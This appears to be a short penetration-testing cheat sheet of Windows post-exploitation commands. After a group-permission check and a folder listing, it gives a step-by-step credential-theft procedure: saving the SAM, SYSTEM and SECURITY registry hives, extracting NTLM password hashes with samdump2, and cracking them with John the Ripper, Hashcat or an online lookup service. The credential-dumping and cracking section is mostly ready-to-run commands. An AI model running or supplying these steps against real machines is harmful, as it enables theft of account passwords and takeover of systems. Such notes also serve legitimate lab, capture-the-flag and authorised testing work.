

## **Check User Permissions and Group Info (Filtered View)**

```bash
whoami /all | Select-String -Pattern "username" -Context 2,0

# example
whoami /all | Select-String -Pattern "wade" -Context 2,0
```
This command helps you **find out what groups or permissions a specific user (like `jareth`) has** on a Windows system. It searches through the detailed `whoami /all` output and shows any lines related to the user, along with 2 lines above it for extra context. Useful during **privilege escalation** to check if a user has powerful roles or tokens.

# Show folders recursive 

```bash
tree /f
```

# Dumping NTLM Hashes
#### Step 1: Save the Registry Hives
📝 Make sure you have administrative or SYSTEM privileges to run these commands.

```bash
# Stores user password hashes
reg save HKLM\SAM SAM   

# Contains the boot key used to decrypt the hashes
reg save HKLM\SYSTEM SYSTEM 

# May be used for further secrets (e.g., LSA secrets
reg save HKLM\SECURITY SECURITY 
```
#### Step 2: Extract Hashes Using `samdump2`
Once you have the `SAM` and `SYSTEM` hives, extract the hashes with: 

```
samdump2 SYSTEM SAM
```
#### Step 3: Crack the Hashes
I take the LM code of  and decode it through online site _Crackstation,_ you guys can try it with offline tools like: **_JohnTheRipper_** or **_Hashcat_**.
```bash
# _JohnTheRipper_
john --format=nt hash.txt --wordlist=rockyou.txt

#_Hashcat_
`hashcat -m 1000 hash.txt rockyou.txt`
```
